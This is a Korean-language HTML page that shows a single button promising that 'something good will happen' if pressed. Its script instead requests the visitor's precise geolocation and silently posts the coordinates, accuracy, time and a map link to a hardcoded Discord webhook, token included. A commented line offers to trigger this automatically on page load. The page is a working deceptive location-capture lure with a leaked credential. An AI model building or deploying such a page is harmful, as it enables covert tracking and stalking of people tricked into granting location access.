<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>버튼을 누르세요!</title>
  <style>
    body {
      font-family: -apple-system, sans-serif;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      height: 100vh; margin: 0;
      background: #1e1f22; color: #fff;
    }
    button {
      padding: 14px 28px; font-size: 16px;
      background: #5865F2; color: #fff;
      border: none; border-radius: 8px;
      cursor: pointer;
    }
    button:disabled { background: #555; cursor: not-allowed; }
    #status { margin-top: 20px; font-size: 14px; color: #b5bac1; }
  </style>
</head>
<body>
  <h2>📍 이 버튼을 누르세요!</h2>
  <p>버튼을 누르면 좋은일이 일어납니다.</p>
  <button id="btn">버튼</button>
  <p id="status">대기 중</p>

  <script>
    // ⚠️ 여기에 디스코드 Webhook URL 입력 (노출 위험 있음!)
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';

    const btn = document.getElementById('btn');
    const status = document.getElementById('status');

    // 페이지 진입 시 자동 실행 (원하면 주석 해제)
    // window.addEventListener('load', () => btn.click());

    btn.addEventListener('click', () => {
      if (!navigator.geolocation) {
        status.textContent = '❌ 브라우저가 위치를 지원하지 않습니다.';
        return;
      }

      btn.disabled = true;
      status.textContent = '⏳ 위치 권한 요청 중...';

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          status.textContent = '📤 전송 중...';

          const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });

          const payload = {
            embeds: [{
              title: '📍 새로운 위치 정보',
              description: `[🗺️ 구글맵에서 보기](${mapUrl})`,
              color: 0x5865F2,
              fields: [
                { name: '🌐 위도', value: `\`${latitude}\``, inline: true },
                { name: '🌐 경도', value: `\`${longitude}\``, inline: true },
                { name: '🎯 정확도', value: `\`${Math.round(accuracy)}m\``, inline: true },
                { name: '🕐 시간', value: now, inline: false }
              ],
              footer: { text: '위치 찾기 시스템' },
              timestamp: new Date().toISOString()
            }]
          };

          try {
            const res = await fetch(WEBHOOK_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            });

            if (res.ok) {
              status.textContent = '✅ 전송 완료!';
            } else {
              status.textContent = `❌ 실패 (HTTP ${res.status})`;
              btn.disabled = false;
            }
          } catch (e) {
            status.textContent = '❌ 오류: ' + e.message;
            btn.disabled = false;
          }
        },
        (err) => {
          status.textContent = '🚫 권한 거부 또는 오류: ' + err.message;
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  </script>
</body>
</html>
